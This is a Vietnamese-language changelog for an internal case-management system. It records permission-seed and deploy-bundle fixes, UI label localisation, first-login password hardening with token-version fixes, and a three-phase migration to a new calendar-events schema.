**Root cause sâu hơn**: KHÔNG CHỈ `seed-permissions.ts` mà nhiều file trong `prisma/` import từ `backend/src/`. Cụ thể `seed-feature-flags.ts` import `feature-registry.ts` → transitive imports tới ~30+ `feature.manifest.ts` files trên toàn `backend/src/`. Bundle ship qua deploy.yml KHÔNG ship `backend/src/` → ts-node fail.

**Fix**: Thêm `backend/src` vào tarball trong `.github/workflows/deploy.yml`. Exclude tests + fixtures để bundle gọn (raw `src/` 2.4MB → sau exclude ~1.5MB → compressed ~175KB).

Excludes:
- `backend/src/**/*.spec.ts` — unit tests
- `backend/src/**/__tests__` — integration test dirs
- `backend/src/test-fixtures` — test data
- `backend/src/test-utils` — test helpers

Sau v0.21.5.0 deploy, `npm run db:seed` trên VM sẽ chạy success. Permission grant đã đẩy lên DB qua SQL workaround tại 2026-05-14 06:50 UTC, nên seed re-run chỉ idempotent confirm — không thay đổi data thêm.

**Lesson learned thứ 2**: deploy bundle phải ship cả `backend/src` raw TS để bất kỳ `ts-node` runtime script nào (seed, migration helpers, etc.) đều resolve được imports. Pure-dist tarball không đủ.

---

## [0.21.4.0] - 2026-05-14

### Fixed — Seed import broken on prod (hot-hot-fix v0.21.3.0)

v0.21.3.0 ship Setting permission registry vào `src/seed/seed-permissions.ts` rồi `prisma/seed.ts` import từ `../src/seed/seed-permissions`. Code build + tests local pass, deploy lên VM thành công, NHƯNG `npm run db:seed` trên prod fail vì:

```
TSError: Cannot find module '../src/seed/seed-permissions'
```

**Root cause**: `.github/workflows/deploy.yml` tarball CHỈ ship `backend/dist/` + `backend/prisma/`, KHÔNG ship `backend/src/` (raw TypeScript). Seed runs via `ts-node prisma/seed.ts` cần resolve import tại runtime → `src/seed/` không tồn tại trên VM → throw.

**Fix**: Colocate `seed-permissions.ts` vào `prisma/` cùng chỗ với `seed.ts`. Mọi import của seed runtime từ giờ phải nằm trong `prisma/` directory. Test file (`src/seed/seed-permissions.spec.ts`) update import path → `../../prisma/seed-permissions`.

Sau v0.21.4.0 deploy, em sẽ re-run seed:
```bash
ssh pc02vm 'cd /home/pc02/current/backend && npm run db:seed'
```

**Lesson learned**: thêm vào memory để tránh tương lai — seed runtime imports phải nằm trong `prisma/`.

---

## [0.21.3.0] - 2026-05-14

### Fixed — Permission seed thiếu `Setting` → admin pages 403 (ISSUE-001 từ QA)

QA toàn hệ thống (`/qa-only` 2026-05-14) phát hiện 2 admin endpoints trả 403 cho super-admin:
1. `GET /api/v1/settings` → trang `/admin/settings` không tải được cấu hình hệ thống
2. `GET /api/v1/calendar/events` → trang `/calendar` không tải được sự kiện

**Root cause #1 (ISSUE-001)**: `SettingsController` require permission `Setting:read`/`Setting:write` nhưng `prisma/seed.ts` chưa bao giờ khai báo subject `Setting` trong mảng permissions. Kết quả: row permission không tồn tại trong DB → admin role grant qua `findMany()` không có → MỌI user (kể cả super-admin) đều 403.

**Root cause #2 (ISSUE-002)**: `Calendar:read` đã có trong seed (PR 1 v0.16.0.0). Bug là prod DB chưa được re-seed sau khi PR 1 ship → admin role chưa được assign Calendar:read rolePermission. Fix code không cần — chỉ cần re-run seed trên prod.

**Fixes**
- Add `Setting:read` + `Setting:write` permissions vào seed registry
- Refactor: extract permissions array từ `prisma/seed.ts` ra `src/seed/seed-permissions.ts` để testable mà không cần DB connection
- 8 unit tests mới (`seed-permissions.spec.ts`) khẳng định mọi controller subject (Setting, Calendar, Case, User, Petition, Incident, Subject, Lawyer) đều có permission tương ứng + không duplicate
- Test pattern này catch class lỗi giống ISSUE-001 trước khi merge

**Operational note**: Sau khi v0.21.3.0 deploy lên prod, **PHẢI re-run seed**:
```bash
ssh pc02vm 'cd /home/pc02/current/backend && npm run db:seed'
```
Seed idempotent — chỉ thêm permissions mới + grant cho ADMIN, không xóa data.

---

## [0.21.2.0] - 2026-05-14

### Fixed — Hot-fix v0.21.1.0: roles thực tế của hệ thống + 2 dropdown miss

v0.21.1.0 add Vietnamese labels cho `ADMIN/SYSTEM/INVESTIGATOR/TRUONG_DON_VI` theo `role.constants.ts`. Nhưng production DB seed (`backend/prisma/seed.ts`) thực sự chỉ tạo 3 roles: `ADMIN`, `OFFICER`, `DEADLINE_APPROVER`. Frontend constant file bị stale → labels không match → user vẫn thấy raw constants `OFFICER`, `DEADLINE_APPROVER` trong dropdown "Gán vai trò".

Đồng thời v0.21.1.0 miss 2 dropdown trong UserManagementPage.tsx — chỉ fix 5/7 site:
- Line 468 (filter "Tất cả vai trò" trên top toolbar)
- Line 872 (modal Add/Edit User → "Gán vai trò" select)

**Fixes**
- `ROLE_LABEL` thêm: `OFFICER → Cán bộ điều tra`, `DEADLINE_APPROVER → Người phê duyệt thời hạn`. Giữ legacy keys (SYSTEM/INVESTIGATOR/TRUONG_DON_VI) làm fallback cho env có seed khác.
- 2 site miss tại UserManagementPage.tsx (filter dropdown + Edit user modal) giờ wrap `getRoleLabel()`.
- 2 unit tests mới khẳng định OFFICER + DEADLINE_APPROVER label đúng.

Tổng cộng UserManagementPage giờ cover 7/7 role display sites.

---

## [0.21.1.0] - 2026-05-14

### Fixed — UI hiển thị enum constants thay vì tiếng Việt

Cán bộ điều tra mở màn hình "Chỉnh sửa người dùng" tại phần "Gán vai trò" đang thấy raw constants `ADMIN`, `INVESTIGATOR`, `TRUONG_DON_VI` thay vì label tiếng Việt. Tương tự, Activity Log hiển thị action như "CASE CREATED", "USER LOGIN" — không có ý nghĩa với người dùng cuối. Bản vá rà soát toàn bộ hệ thống và chuẩn hóa hiển thị end-user sang tiếng Việt.

**Cán bộ điều tra giờ thấy**
- Vai trò: "Quản trị viên", "Điều tra viên", "Trưởng đơn vị", "Hệ thống" thay vì `ADMIN/INVESTIGATOR/TRUONG_DON_VI/SYSTEM` ở mọi nơi (badge bảng users, dropdown gán vai trò trong Edit user, ma trận phân quyền, dialog xác nhận lưu, file CSV xuất ra).
- Hành động trong Nhật ký hoạt động: "Tạo vụ án" / "Tiếp nhận đơn thư" / "Đăng nhập" / "Đổi mật khẩu" / "Chuyển đơn thư thành vụ án" thay vì `CASE_CREATED / PETITION_CREATED / USER_LOGIN / PASSWORD_CHANGED / PETITION_CONVERTED_TO_CASE`. Áp dụng cả ở danh sách log lẫn drawer chi tiết.

**Cài đặt kỹ thuật**
- Hai map mới `ROLE_LABEL` (4 vai trò) và `AUDIT_ACTION_LABEL` (~60 hành động backend) trong `frontend/src/shared/enums/`, kèm helper `getRoleLabel(name)` / `getAuditActionLabel(action)` có graceful fallback — backend thêm enum mới sẽ không crash UI mà hiển thị raw text như cũ cho tới khi label được bổ sung.
- Re-export từ `locales/vi.ts` theo cùng pattern các status label hiện có.
- 16 test mới (8 role + 8 audit-action + 8 cho mapper `auditLogToEntry` của ActivityLogPage). Full suite vẫn green: 453/453 frontend + 1211 backend.

### Changed
- `ActivityLogPage.tsx`: export `auditLogToEntry` mapper và centralize translation tại điểm map API → row → mọi display site (list, drawer, CSV) cùng dùng output đã dịch.
- `UserManagementPage.tsx`: 5 site dùng helper `getRoleLabel(role.name)` thay vì raw `role.name`.

### Notes
- `SettingsPage.tsx` không đụng — roles array là hardcoded tiếng Việt từ trước, audit ban đầu đánh giá nhầm là raw display.
- Không có thay đổi backend, không migration. Pure frontend i18n cleanup.

---

## [0.21.0.0] - 2026-05-13

### Added — Auth Hardening v1: Force first-login password change

Đóng lỗ hổng impersonation cho hệ thống nội bộ PC02: trước đây admin gõ password khi tạo user → admin biết password đó vĩnh viễn → có thể login dưới danh nghĩa cán bộ trước khi cán bộ sử dụng tài khoản lần đầu. Audit log không phân biệt được. Đối với hệ thống quản lý hồ sơ vụ việc hình sự, đây là vi phạm nguyên tắc non-repudiation.

**Tính năng cho cán bộ và admin**
- Cán bộ phải đổi mật khẩu khi đăng nhập lần đầu, qua trang riêng `/auth/first-login-change-password` (giống TwoFaPage pattern). Mật khẩu tạm chỉ dùng được 1 lần để đăng nhập, sau đó cán bộ tự đặt mật khẩu riêng — quản trị viên không thể xem mật khẩu mới.
- Admin không còn gõ password khi tạo user. Hệ thống sinh tự động mật khẩu tạm 16 ký tự (1 chữ hoa, 1 chữ thường, 1 số, 1 ký tự đặc biệt từ `!@#$%^&*`, loại bỏ I/O/l/0/1 cho dễ đọc), hiển thị 1 lần trong modal không tắt được — phải copy hoặc tick "tôi đã bàn giao" mới đóng được. Cùng UX cho luồng reset password.
- Lần đầu login: trang dedicated với hint compliance, password strength checklist real-time (a11y: aria-live), confirm password field, countdown 15 phút trước khi token hết hạn.

**Bảo mật được vá**

3 lỗi nghiêm trọng đã tồn tại từ trước được phát hiện và fix trong PR này:
- `JwtStrategy` chỉ reject `refresh` token; pending token (`2fa_pending`) có thể dùng làm access token gọi business API. Đã sửa: reject mọi token có type không phải `access`.
- Admin reset password không bump `tokenVersion` → user vẫn dùng được access token cũ 15 phút sau khi reset. Đã sửa: tokenVersion increment trên mọi password reset.
- `refreshToken()` không so sánh `payload.tokenVersion` với `user.tokenVersion` → migration force re-login không hiệu quả với user đang giữ refresh token. Đã sửa: enforce tokenVersion trên refresh path.

**Token binding chống race condition**

Pending token (`2fa_pending` và `change_password_pending`) đều bind `tokenVersion` vào payload tại thời điểm phát hành. Guard so sánh `payload.tokenVersion === user.tokenVersion`. Admin reset xen vào giữa quy trình → token cũ bị từ chối. Đồng thời `firstLoginChangePassword` dùng `updateMany WHERE tokenVersion=expected` (optimistic lock) để chống replay race khi 2 request đồng thời với cùng token. Admin reset cũng dùng cơ chế tương tự để 2 admin reset song song không cùng thành công.

**Audit cho compliance**

5 sự kiện audit mới:
- `ADMIN_PASSWORD_RESET` — admin reset password user khác (metadata: targetUsername, tempPasswordGenerated)
- `FIRST_LOGIN_PASSWORD_CHANGED` — user hoàn tất đổi password lần đầu
- `USER_LOGIN_BLOCKED_PENDING_PASSWORD_CHANGE` — mỗi lần login bị chặn vì cần đổi password (signal brute-force)
- `USER_LOGIN` cũng emit khi forced-change hoàn tất (metadata `viaForcedChange:true`) — compliance query trên USER_LOGIN không miss session này
- `USER_2FA_VERIFIED` metadata `blockedPendingChange:true` khi user pass 2FA nhưng còn pending change-pw

Tất cả ghi trong cùng `prisma.$transaction` với DB update → audit và state luôn nhất quán.

### Changed

- `CreateUserDto` và `UpdateUserDto`: xóa field `password`, thêm `resetPassword: boolean` flag cho `UpdateUserDto`. Admin gọi `PATCH /admin/users/:id { resetPassword: true }` để trigger reset.
- `AuthService.resetPassword` (forgot-password OTP): clear `mustChangePassword` flag để user qua self-reset không bị block bởi forced-change cũ.
- bcrypt cost: extract `hashPassword()` shared util — prod cost 12, test cost 4 (tests/auth giờ chạy nhanh hơn ~20s).
- Frontend `api.ts` interceptor: không override `Authorization` header nếu request đã set sẵn (bảo vệ pending token call).

### Fixed (pre-existing bugs caught during /autoplan + Codex review)

- [CRITICAL] `JwtStrategy.validate()` chấp nhận pending token làm access token (ảnh hưởng 2FA đã ship trước đó).
- [CRITICAL] `refreshToken()` không enforce tokenVersion → migration tokenVersion bump không thực sự log out user.
- [HIGH] `AdminService.updateUser` không bump tokenVersion trên password reset → 15-min bypass window.
- [HIGH] Audit log không trong `$transaction` với DB write trên admin path → có thể audit miss khi DB write thành công.

### Migration & deployment

2 migrations chạy tuần tự trên deploy:
1. `20260513160000_add_must_change_password` — thêm 2 columns `mustChangePassword` (default false) và `passwordChangedAt` (nullable) vào `users`. User cũ không bị backfill — không bị forced-change.
2. `20260513160100_force_token_invalidation` — `UPDATE users SET tokenVersion = tokenVersion + 1` cho tất cả users. **Tác động ops: mọi user đang login sẽ bị đăng xuất 1 lần khi deploy.** Cần thiết để vá lỗ hổng JwtStrategy. Flag trong deploy notes — chấp nhận được cho hệ thống nội bộ.

### Test surface

- Backend: 1203 tests pass (+17 mới so với baseline 1186) — JwtStrategy, ChangePasswordPendingGuard, TwoFaTokenGuard, temp-password generator, password-hash util, AdminService refactor (createUser + updateUser), AuthService.login + firstLoginChangePassword + refreshToken tokenVersion + AuthService.resetPassword.
- Frontend: 409 tests pass (+19 mới so với baseline 390) — PasswordStrengthChecklist, TempPasswordHandoverModal (clipboard, non-dismissible, ESC blocked), api.ts interceptor (#5 fix).

### Review pipeline

- **/autoplan**: Phase 1 CEO + Phase 2 Design + Phase 3 Eng dual voices (Codex + Claude subagent) → 3 CRITICAL findings caught (JwtStrategy bypass, 2FA verify recheck, admin tokenVersion). User Challenge gate qua, scope Option B (F1 + F3 must-haves).
- **Codex challenge round 1**: 7 findings (2 CRITICAL + 3 HIGH + 2 LOW) — all fixed via TDD.
- **Codex review round 2**: 3 findings (2 P1 + 1 P2) — all fixed via TDD. Catch chính chỗ em miss ở round 1: token binding cần áp dụng consistently cho cả 2 pending types + end-to-end (guard → service).

## [0.20.0.0] - 2026-05-13

### Changed — Calendar Events v2, Phase 3 (drop legacy Holiday table)

**Final PR của chuỗi 3-PR phased migration.** Plan ban đầu chia thành 3 PR để giảm risk: PR 1 add new schema song song với Holiday, PR 2a/2b/2c build full feature, **PR 3 migrate data + drop legacy**. Đến PR 3 hệ thống đã production-stable với CalendarEvent table, an toàn migrate 25 holiday rows sang rồi drop bảng cũ.

#### Migration `20260513140000_calendar_events_v2_phase3_drop_holiday`

Chạy trong 1 transaction để không có partial state:

1. **INSERT INTO calendar_events SELECT FROM holidays** với mapping:
   - `id` giữ nguyên (cùng `cuid` format)
   - `categoryId` lookup từ `event_categories` qua `slug = lower(category::text)` (NATIONAL → "national", v.v.)
   - `scope = 'SYSTEM'`
   - `recurrenceRule = 'FREQ=YEARLY'` nếu `isRecurring=true`, else `NULL`
   - `createdById` = admin user ID (admin@pc02.local)
   - `WHERE NOT EXISTS` guard cho idempotency (chạy lại migration không double-insert)
2. **PL/pgSQL verification block** raise exception nếu `migrated_count < holiday_count` (data integrity guard)
3. **DROP TABLE holidays**
4. **DROP TYPE HolidayCategory**

Pre-deploy `pg_dump` backup từ pipeline cover rollback nếu cần.

#### Code cleanup

- **`backend/prisma/schema.prisma`**: xóa `model Holiday` + `enum HolidayCategory` (replaced bằng comment chỉ ra migration file)
- **`backend/prisma/seed-holidays.ts`**: DELETED (25 holiday seed entries giờ là 25 SYSTEM events trong calendar_events)
- **`backend/src/calendar/calendar.service.ts`**: bỏ `prisma.holiday.findMany` từ Promise.all, giờ chỉ query 3 deadline sources + `calendar_events`. Output `type='event'` cho mọi entry (PR 2 đã thay `type='holiday'` ra rồi).
- **`backend/src/calendar/calendar.service.spec.ts`**: bỏ `makeHoliday()` helper + `mockPrisma.holiday` mock + `'maps holidays with category metadata'` test. Rename describe block "dual-read (PR 1)" → "calendar events (PR 3 — Holiday dropped)".

#### Tests
- **Backend: 1144/1144 pass** (-1 từ PR 2c's 1145 vì xóa 1 test holiday-specific)
- `tsc --noEmit` clean

#### Deploy notes

- **Migration drop is destructive** — pre-deploy pg_dump backup essential. Pipeline default đã có `pg_dump pre-deploy-<sha>.sql.gz`.
- Sau deploy verify: `SELECT COUNT(*) FROM calendar_events WHERE scope='SYSTEM';` phải = 25 (migrated holidays) + bất kỳ SYSTEM events nào admin đã tạo từ PR 2a/2b/2c.
- KHÔNG cần manual seed sau deploy (migration self-contained).
- Rollback strategy: `pg_restore` từ backup trước migration nếu cần (Prisma không hỗ trợ auto-down migration).

## [0.19.0.0] - 2026-05-13

### Added — Calendar Events v2, Phase 2c (UI polish + RRULE-aware cron)

PR 2c hoàn thiện full UI surface theo design review wishlist + cho phép cron dispatcher fire reminders cho recurring events.

#### Backend — RRULE-aware reminder dispatcher

`computeOccurrencesInWindow()` (mới trong `event-reminders.service`):
- Non-recurring: 1 occurrence trên `combineDateTime(startDate, startTime)` nếu trong trigger window
- Recurring: `rrulestr(rrule, { dtstart })` rồi `between(searchFrom, searchTo, inc=true)` với search range ±7 ngày quanh trigger window (forgiving với DTSTART TZ jitter), hard cap 100 occurrences/event/window
- Apply EXDATE overrides: nếu `override.excluded=true` → skip
- Forgiving tolerance: `startRangeFrom` trừ 60s khỏi exact trigger time → catches occurrences mà rrule trả về minute-aligned (không có ms) khi `now` có sub-second precision. UNIQUE constraint trên `EventReminderDispatch` ngăn double-fire.

Trước PR 2c: dispatcher skip mọi recurring events (`if (ev.recurrenceRule) continue`). Sau PR 2c: dispatcher fire đúng cho FREQ=WEEKLY/MONTHLY/YEARLY/DAILY (với endDate guard).

#### Frontend — RecurrenceBuilder (visual UI)

Thay 4-radio preset cũ trong `CreateEventModal` bằng `RecurrenceBuilder`:
- 5 preset radio: Không lặp / Hàng năm / Hàng tháng / Hàng tuần / **Tùy chỉnh**
- Khi chọn Tùy chỉnh: BYDAY checkboxes T2-CN + INTERVAL number (1-52 tuần)
- Live preview text: "Lặp lại vào T2, T4 mỗi 2 tuần"
- `buildRRule()` helper convert preset + custom config → RFC 5545 RRULE string

#### Frontend — ReminderEditor (inline trong CreateEventModal)

- Compact list với 4 preset (15p / 1h / 1d / 1w) + channels FCM/Email checkbox
- Prevent duplicate `minutesBefore` cho cùng event
- Sau khi event tạo thành công, modal best-effort POST từng reminder qua `eventRemindersApi.create()` (1 reminder fail không break flow)

#### Frontend — RecurringDeleteDialog (data integrity critical)

Component dialog 2-button:
- **"Chỉ xóa ngày này"** → `calendarEventsApi.excludeOccurrence(eventId, date)` (insert EXDATE override row, soft skip 1 occurrence)
- **"Xóa cả chuỗi sự kiện"** → `calendarEventsApi.remove(eventId)` (soft delete parent)
- Non-recurring events: chỉ hiển thị 1 button "Xóa sự kiện"
- Wired vào CalendarPage `handleEventClick`: khi user click event có id format `event-{cuid}-{YYYY-MM-DD}`, parse eventId + date, detect recurring iff cùng eventId xuất hiện trên nhiều ngày trong view → mở dialog với option phù hợp

Prevents the design review concern: "user xóa recurring event = nuke 52 occurrences silently".

#### Frontend — Filter chips (scope toggle)

Trong CalendarPage giữa header và calendar grid:
- 4 chips: "Deadline + Lễ" / "Hệ thống" / "Tổ" / "Cá nhân"
- LEGACY chip cover deadline + holiday từ Holiday table (giữ backward compat)
- SYSTEM/TEAM/PERSONAL chips cover events từ CalendarEvent table với scope tương ứng
- Toggle bằng click — `filteredEvents` reactive memo

#### Frontend — Scope visual treatment trên day cell

`getScopeBorderStyle(scope)`:
- SYSTEM: solid border (mặc định)
- TEAM: `border-dashed border-white/60`
- PERSONAL: `border-dotted border-white/60`

User phân biệt scope ngay từ day cell mà không cần click vào event.

### Tests
- Backend: 2 new tests cho RRULE-aware dispatcher (fire recurring + skip EXDATE) → 1145/1145 pass total
- Frontend: 390/390 pass (RecurringDeleteDialog + RecurrenceBuilder + ReminderEditor compile + integrate; visual tests defer cho user-facing manual verify)
- `tsc --noEmit` file em touch clean

### Out of scope (defer to future PR nếu cần)
- 2-step wizard cho EventFormModal (hiện tại 1-step modal đủ dùng)
- Mobile-specific bottom sheet (modal scroll OK trên mobile)
- Cron concurrency lock across multiple VM instances (single VM hiện tại OK)

### Deploy notes
- KHÔNG migration mới — schema giữ từ PR 1
- Cron sẽ tự pick up logic mới khi backend restart sau deploy
- Frontend bundle increase ~30KB do `rrule` import — acceptable

## [0.18.0.0] - 2026-05-13

### Added — Calendar Events v2, Phase 2b (reminders + frontend module + admin UI)

PR 2b ship phần còn lại của plan Phase 2: event reminder backend (CRUD + cron dispatcher + prune) + frontend admin UI (EventCategoriesModule + CreateEventModal in CalendarPage). PR 3 còn lại sẽ migrate 25 holidays sang CalendarEvent rồi drop bảng cũ.

#### Backend — event-reminders module hoàn chỉnh

- **CRUD endpoints:**
  - `POST /events/:eventId/reminders` (throttle 20/min): user tự tạo reminder
  - `GET /events/:eventId/reminders`: list reminders của current user
  - `DELETE /events/:eventId/reminders/:reminderId`: owner-only delete
  - DTO: `CreateReminderDto` với `minutesBefore` (1-43200 phút, max 30 ngày) và `channels[]` (FCM/EMAIL)
  - Reject duplicate `(eventId, userId, minutesBefore)` → 409
- **Cron dispatcher** (`@Cron('*/5 * * * *')`):
  - **In-process mutex** (`this.running` flag) chống overlap khi FCM chậm (Eng review fix #2)
  - Window `[now, now + 6 minutes]` (chứ không 1 giờ như plan gốc — giảm số INSERT duplicate)
  - Insert `EventReminderDispatch` row BEFORE send → UNIQUE `(reminderId, occurrenceDate)` catches concurrent claims atomically
  - Gửi qua `PushService.sendToUser()` (FCM HTTP v1) + `EmailService.sendEventReminder()` (mới)
  - Mỗi send wrapped try/catch — không break loop nếu 1 user fail
  - PR 2b chỉ xử lý non-recurring events (recurring + RRULE expansion trong cron defer cho tương lai — acceptable tradeoff: events vẫn hiện trên calendar, chỉ không gửi reminder)
- **Prune cron** (`@Cron('0 2 * * *')`): xóa `event_reminder_dispatches` cũ hơn 90 ngày
- **EmailService.sendEventReminder()**: HTML email với event title + ngày, log warn nếu fail (non-fatal)

#### Frontend — EventCategoriesModule (Settings)

- Mount vào Settings menu với icon Tag — admin tạo/sửa/xóa category dynamic
- Color picker: 8 preset swatches + native `<input type=color>` + hex validation regex
- isSystem categories: badge "Hệ thống" + nút Xóa ẩn (chỉ Sửa được)
- Form: slug required khi tạo mới (regex `^[a-z0-9_-]+$`), slug read-only khi edit
- Whitelist update: chỉ POST `{name, color, icon, sortOrder}` (không slug, không isSystem — service strip silently)
- 5 frontend tests cover: list render, system badge, delete button disabled, POST create, PATCH update (slug excluded)

#### Frontend — CreateEventModal (CalendarPage)

- Button "Tạo sự kiện" trong CalendarPage header — opens modal API-backed (POST `/calendar-events`)
- Form fields: title, date, category dropdown (từ `eventCategoriesApi.list()`), allDay toggle + start/end time, scope (admin chọn SYSTEM/PERSONAL — user thường chỉ PERSONAL), recurrence preset 4 options (Không lặp/Hàng năm/Hàng tháng/Hàng tuần), recurrence end date, description
- Success → refetch calendar events (legacy endpoint dual-read trả expanded recurring + holidays)

#### API clients (`frontend/src/lib/api.ts`)

- `eventCategoriesApi`: list/get/create/update/remove
- `calendarEventsApi`: list/create/update/remove/excludeOccurrence (cho occurrence EXDATE)
- `eventRemindersApi`: list/create/remove (cho event-id-scoped reminders)
- Type-safe payload + response interfaces (`EventCategory`, `CalendarEvent`, `EventReminder`, `EventScope`, `ReminderChannel`)

### Tests
- Backend: 14 new tests trong `event-reminders.service.spec` (CRUD + dispatcher mutex + duplicate dispatch UNIQUE + prune cron) → 1143/1143 pass total (+12 từ PR 2a)
- Frontend: 5 new tests trong `EventCategoriesModule.test.tsx` → 390/390 pass total (+5 từ PR 2a)
- `tsc --noEmit` clean trên file em touch (4 pre-existing errors ở files unrelated giữ nguyên)

### Out of scope (deferred to PR 2c hoặc PR 3)

- Frontend **EventFormModal 2-step wizard** (PR 2b ship 1-step CreateEventModal là MVP đủ dùng)
- Frontend **RecurrenceBuilder visual UI** (PR 2b ship 4-radio preset là đủ, custom RRULE textarea bị drop theo Design review)
- Frontend **ReminderEditor** inline trong CalendarPage (PR 2b ship API-backed CRUD nhưng UI chưa expose — user tạo reminder qua admin tools/API call)
- Frontend **CalendarPage filter chips** (scope SYSTEM/TEAM/PERSONAL toggle) — defer
- Frontend **recurring delete confirm dialog** (Cả series vs chỉ ngày này) — defer, hiện tại DELETE soft delete cả series
- Frontend **scope visual border/icon** trên day cell — defer
- Cron dispatcher RRULE-aware: hiện chỉ fire cho non-recurring events. Recurring reminder defer
- PR 3: migrate 25 holidays → CalendarEvent + DROP TABLE holiday + DROP TYPE HolidayCategory

### Deploy notes

- KHÔNG có migration mới (schema giữ nguyên từ PR 1)
- `@Cron` decorators tự register khi backend khởi động — dispatcher fire mỗi 5 phút, prune fire daily 02:00
- Cron schedule single-instance OK vì 1 VM. Nếu scale-out → cần lock external (Redis SETNX hoặc DB advisory lock)
- Reminder dispatch tới user cần `userDevice` row có valid FCM token + `user.email` không null. User chưa setup FCM thì FCM send skip, chỉ gửi email
- Sau deploy chạy 1 lần: nothing special — feature flag từ PR 1 vẫn enabled, endpoints mới accessible ngay

## [0.17.0.0] - 2026-05-13

### Added — Calendar Events v2, Phase 2a (backend CRUD + RRULE expansion)

Đây là **PR 2a** trong chuỗi 3-PR phased. Phase 2 ban đầu plan ship 1 PR lớn (backend + frontend + cron) trong ~10 ngày. Em tách thành 2a (backend, đã ship) + 2b (frontend + cron dispatcher) để risk thấp + value ship sớm. Feature flag default ON, nhưng UI chưa rewrite nên user chưa thấy gì khác — backend endpoints sẵn sàng cho frontend PR 2b gọi.

#### Backend modules — full CRUD

**`event-categories`** (extends PR 1 read-only skeleton):
- `POST /api/v1/event-categories` — admin tạo category mới (10/min throttle anti-spam)
- `PATCH /api/v1/event-categories/:id` — sửa name/color/icon/sortOrder (slug và isSystem là read-only, service strip silently)
- `DELETE /api/v1/event-categories/:id` — chặn nếu `isSystem=true` (403) hoặc còn event tham chiếu (409)
- DTOs: `CreateCategoryDto` (slug regex `^[a-z0-9_-]+$`, color regex `^#[0-9a-fA-F]{6}$`), `UpdateCategoryDto` (PartialType, whitelist)

**`calendar-events`** (full CRUD with scope authorization):
- `POST /api/v1/calendar-events` — tạo event (20/min throttle per user)
  - SYSTEM scope: require ADMIN role
  - TEAM scope: require user là tổ trưởng của teamId (qua `userTeam.isLeader=true` DB lookup) HOẶC admin
  - PERSONAL scope: backend **force `userId = currentUser.id`** (ignore any client-sent userId — prevent spoofing onto another user)
- `PATCH /api/v1/calendar-events/:id` — update với owner+scope check (SYSTEM events require ADMIN even if createdById match)
- `DELETE /api/v1/calendar-events/:id` — soft delete (set `deletedAt`), giữ audit history
- `DELETE /api/v1/calendar-events/:id/occurrence/:date` — exclude 1 occurrence của recurring series (RFC 5545 EXDATE pattern), tạo override row `excluded=true`
- Per-user cap: `PERSONAL` events ≥ 1000 → 409 (Eng review fix #3)
- RRULE safety: DTO reject `FREQ=DAILY/HOURLY/MINUTELY/SECONDLY` nếu không có `recurrenceEndDate`/`UNTIL`/`COUNT` (Eng review fix #4)
- DataScope filtering trong `findInRange`: admin thấy tất, non-admin thấy SYSTEM + own TEAM events (qua `userTeam` DB lookup, NOT JWT) + own PERSONAL events

#### RRULE expansion (`expandOccurrences()`)

- Sử dụng `rrule` npm package (RFC 5545 iCalendar standard)
- Non-recurring event: 1 occurrence trên `startDate` nếu trong range
- Recurring event: `RRule.between(from, to, true)` expand thành các occurrence dates
- **Hard cap 500 occurrences/event** — DoS protection (Eng review)
- Apply override rows: `excluded=true` → skip occurrence (EXDATE), `overrideFields` JSON → modify title/time per occurrence (PR 2b sẽ build UI)
- Malformed RRULE → graceful fallback (single occurrence on startDate)

#### `calendar.service` integration

- `GET /api/v1/calendar/events?year=&month=` giờ expand recurring events đúng cách:
  - Query mở rộng: lấy events có `startDate <= toDate AND (recurrenceEndDate IS NULL OR >= fromDate)` — catch recurring series bắt đầu trước window nhưng có occurrences trong window
  - Output id format: `event-{eventId}-{YYYY-MM-DD}` — distinct per occurrence
  - Trước đây: 1 row recurring = 1 calendar event hiển thị. Giờ: 1 row recurring + FREQ=WEEKLY trong tháng = ~4 calendar events.

#### Architecture

- `CalendarEventsModule` import `TeamsModule` + provide `UnitScopeService` (chuẩn pattern existing scope-aware modules)
- `CalendarModule` import `CalendarEventsModule` để `CalendarService` dùng `expandOccurrences()` qua DI thay vì duplicate logic

### Tests

40 backend tests mới (12 event-categories + 24 calendar-events + 4 PR 1 spec updates trong calendar.service):
- Event-categories CRUD: create with default sortOrder, slug uniqueness conflict, update strips slug/isSystem, delete refuses isSystem + non-empty + missing
- Calendar-events scope rules: SYSTEM admin-only, TEAM leader/admin, PERSONAL force userId
- Per-user cap reject at 1000 PERSONAL
- RRULE safety: DAILY without endDate rejected, YEARLY unbounded OK
- DataScope: admin sees all, non-admin filters by SYSTEM+OR(own TEAM, own PERSONAL)
- Update owner check + admin override + updatedById tracking
- Soft delete + occurrence exclude
- expandOccurrences: 1-off, year-only, weekly, daily-with-end, EXDATE skip, 500-iter cap

**Full backend suite: 1131/1131 pass** (+40 từ PR 1's 1091), `tsc --noEmit` exit 0.

### Out of scope cho PR 2a (defer to PR 2b)

- Frontend: CalendarPage rewrite (2-step wizard EventFormModal, RecurrenceBuilder UI, ReminderEditor, scope border/icon, recurring delete dialog)
- Frontend: EventCategoriesModule in Settings, 3 API clients, 2 react-query hooks
- Backend `event-reminders`: CRUD POST/DELETE + cron dispatcher với mutex + `PushService.sendToUser` + email integration
- Backend prune cron: daily 02:00 DELETE event_reminder_dispatches WHERE sentAt < 90d
- Lunar date computed display
- DataScope verification with concurrent tests (timezone drift, cascade delete)

### Deploy notes

- Tất cả 3 feature flag mới vẫn ON từ PR 1 → endpoints `/event-categories`, `/calendar-events`, `/events/:id/reminders` (read-only) accessible
- POST/PATCH/DELETE endpoints mới đều cần permission `Calendar:write|edit|delete` (đã seed trong PR 1)
- KHÔNG có migration mới — schema giữ nguyên từ PR 1
- Backward compat: `GET /api/v1/calendar/events` (legacy frontend gọi) vẫn hoạt động đúng cũ + thêm expanded recurring events nếu admin đã tạo
- Nếu cần kill switch: `UPDATE feature_flags SET enabled=false WHERE key IN ('event_categories_v2','calendar_events_v2')` trên VM → routes trả 404

## [0.16.0.0] - 2026-05-13

### Added — Calendar Events v2, Phase 1 (schema + dual-read foundation)

Đây là PR 1 trong chuỗi 3 PR phased (theo /autoplan recommendation, replace Big Bang ban đầu). Mục tiêu PR 1: tạo schema mới SONG SONG với Holiday, không drop. Backend dual-read cả 2 nguồn nên frontend hiện tại không thấy thay đổi gì. PR 2 sẽ build full UI + CRUD + RRULE + reminders. PR 3 sẽ migrate data Holiday → CalendarEvent và drop bảng cũ.

#### Schema (Prisma + migration `20260513120000_calendar_events_v2_phase1`)
- **`EventCategory`** — bảng category động thay thế dần `HolidayCategory` enum. 5 default rows (`isSystem=true`, không cho xóa): national, police, military, international, other.
